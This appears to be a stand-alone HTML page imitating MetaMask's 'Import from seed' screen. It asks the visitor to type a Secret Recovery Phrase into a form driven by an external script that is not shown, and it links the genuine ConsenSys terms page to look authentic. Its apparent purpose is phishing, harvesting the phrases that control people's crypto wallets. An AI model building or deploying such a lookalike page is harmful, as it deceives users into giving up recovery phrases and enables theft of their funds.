<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="metamask.css">
</head>
<body>
  <div class="outer-box">
<!--     <h1 class="back-class"><a class="back" href="#"><img class="img-back" src="./previous.png" alt=""></a></h1> -->
    <div class="upper-box">
      <h1 class="meta">METAMASK</h1>
      <h3 class="import">Import from seed</h3>
    </div>
    <div class="middle-box">
      <form class="form-box">
        <div class="written-box">
            <h2 class="secret">Secret Recovery Phrase</h2>
            <h2 class="secret show">Show</h2>
        </div>
        <input class="input-box" type="password" placeholder="Enter your Secret Recovery Phase ">
        <p class="error-box display"></p>
        <button class="button">proceed</button>
      </form>
    </div>
    <div class="lower-box">
        <p class="t-and-c">By proceeding, you agree to these <a class="a-tag" href="https://legal.consensys.io/metamask/terms-of-use/ ">Terms and Conditions.</a></p>
    </div>
  </div>
  <script src="metamask.js"></script>
</body>
</html>
